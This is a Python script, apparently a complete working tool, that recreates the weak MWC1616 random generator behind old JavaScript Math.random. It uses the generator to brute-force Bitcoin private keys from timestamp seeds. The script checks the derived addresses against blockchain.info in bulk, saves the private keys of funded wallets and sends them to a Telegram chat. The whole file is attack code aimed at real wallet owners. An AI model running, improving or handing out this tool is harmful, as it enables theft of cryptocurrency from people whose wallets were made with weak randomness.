import random
import time
import coincurve
import hashlib
import base58
import asyncio
from aiohttp import ClientSession, ClientTimeout
from dotenv import load_dotenv
import os

load_dotenv()

TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

SAVE_PROGRESS_INTERVAL = 600
BATCH_SIZE = 300000
SEED_INCREMENT = 10

async def send_telegram_message(session: ClientSession, message: str):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        async with session.post(url, data=payload) as resp:
            return await resp.json()
    except Exception as e:
        print(f"Error sending to Telegram: {e}")

class MWC1616:
    def __init__(self, seed):
        self.mw = (seed & 0xFFFF0000) >> 16
        self.mz = seed & 0x0000FFFF
        if self.mw == 0:
            self.mw = 521288629
        if self.mz == 0:
            self.mz = 362436069

    def next(self):
        self.mz = (36969 * (self.mz & 65535) + (self.mz >> 16)) & 0xFFFFFFFF
        self.mw = (18000 * (self.mw & 65535) + (self.mw >> 16)) & 0xFFFFFFFF
        return ((self.mz << 16) + (self.mw & 0xFFFF)) & 0xFFFFFFFF

    def random(self):
        return self.next() / 0x100000000

    def random_byte(self):
        return int(self.random() * 256) & 0xFF

    def random_bytes(self, n):
        return bytes(self.random_byte() for _ in range(n))

def js_mathrandom_entropy(seed):
    rng = MWC1616(seed)
    return rng.random_bytes(32).hex()

def custom_private_key_generator(seed):
    return js_mathrandom_entropy(seed)

def generate_compressed_P2PKH_address(private_key):
    pk = bytes.fromhex(private_key)
    obj = coincurve.PrivateKey(pk)
    pub = obj.public_key.format(compressed=True)
    h = hashlib.new('ripemd160', hashlib.sha256(pub).digest()).hexdigest()
    ext = '00' + h
    chk = hashlib.sha256(hashlib.sha256(bytes.fromhex(ext)).digest()).hexdigest()[:8]
    return base58.b58encode(bytes.fromhex(ext + chk)).decode()

async def check_balances_batch(session: ClientSession, addresses: list[str]) -> dict:
    url = f"https://blockchain.info/multiaddr?active={'|'.join(addresses)}"
    try:
        async with session.get(url) as resp:
            if resp.status == 200:
                data = await resp.json()
                result = {}
                for wallet in data.get("addresses", []):
                    addr = wallet.get("address")
                    bal = wallet.get("final_balance", 0) / 1e8
                    result[addr] = bal
                return result
    except:
        pass
    return {addr: 0 for addr in addresses}


async def mass_check_balance():
    timeout = ClientTimeout(total=20)
    async with ClientSession(timeout=timeout) as session:
        with open('generated_wallet.txt','r') as f:
            lines = f.readlines()
        total = len(lines)
        print(f"Starting balance check for {total} wallets")

        batch_size = 300
        for i in range(0, total, batch_size):
            batch_lines = lines[i:i+batch_size]
            addr_priv_map = {}
            addresses = []

            for line in batch_lines:
                parts = line.strip().split(',', 1)
                if len(parts) != 2:
                    continue
                priv, addr = parts
                addresses.append(addr)
                addr_priv_map[addr] = priv

            balances = await check_balances_batch(session, addresses)
            for addr, bal in balances.items():
                if bal > 0:
                    priv = addr_priv_map[addr]
                    msg = f"FOUND WALLET\nAddress: {addr}\nBalance: {bal} BTC\nPrivate Key: {priv}"
                    await send_telegram_message(session, msg)
                    with open('funded_wallet.txt','a') as wf:
                        wf.write(f"Address: {addr} | Balance: {bal} BTC | Private Key: {priv}\n")

            print(f"Checked balances: {min(i+batch_size, total)}/{total}", end='\r', flush=True)

        print()
        print(f"Completed balance check for {total} wallets")

def save_progress(seed):
    with open('progress.txt','w') as f:
        f.write(str(seed))

def load_progress():
    try:
        return int(open('progress.txt').read().strip())
    except:
        return None

async def generate_and_check_wallets():
    seed = load_progress() or int(input("Masukkan seed mulai (epoch ms): "))
    curr = seed
    print(f"\nStarting generation of {BATCH_SIZE} wallets from seed {curr}")
    while True:
        with open('generated_wallet.txt','w') as f:
            for i in range(1, BATCH_SIZE+1):
                pk = custom_private_key_generator(curr)
                addr = generate_compressed_P2PKH_address(pk)
                f.write(f"{pk},{addr}\n")
                curr += SEED_INCREMENT
                print(f"Generated wallets: {i}/{BATCH_SIZE}", end='\r', flush=True)
        print()
        print(f"Completed generation of {BATCH_SIZE} wallets. Next seed: {curr}")
        await mass_check_balance()
        os.remove('generated_wallet.txt')
        save_progress(curr)

if __name__ == '__main__':
    print("Starting Wallet Generator and Mass Balance Checker\n")
    asyncio.run(generate_and_check_wallets())
